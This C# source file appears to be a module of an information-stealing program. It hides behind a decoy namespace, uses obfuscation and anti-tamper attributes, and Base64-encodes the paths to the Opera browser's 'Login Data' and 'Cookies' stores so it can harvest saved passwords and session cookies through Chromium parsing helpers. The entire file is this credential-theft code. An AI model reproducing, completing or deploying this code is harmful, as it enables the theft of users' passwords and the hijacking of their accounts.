using DebuggerStepThroughAttribute.Base;
using System;
using System.Collections.Generic;
using System.IO;
using DebuggerStepThroughAttribute;
using System.Reflection;

namespace DebuggerStepThroughAttribute
{
    public class O
    {
        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static List<LD> GETLLD()
        {
            try
            {

                string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("T3BlcmEgU29mdHdhcmVcXE9wZXJhIFN0YWJsZVxcTG9naW4gRGF0YQ==")));


                return Chromium.GETLDSs(dataPath, bn.ob);
            }
            catch (Exception)
            {
                return new List<LD>();
            }
        }
        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static List<IReflectableType> GETCCD()
        {
            try
            {

                string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("T3BlcmEgU29mdHdhcmVcXE9wZXJhIFN0YWJsZVxcQ29va2llcw==")));

                return Chromium.GETOPAG(dataPath, bn.ob);
            }
            catch (Exception)
            {
                return new List<IReflectableType>();
            }
        }
    }
}
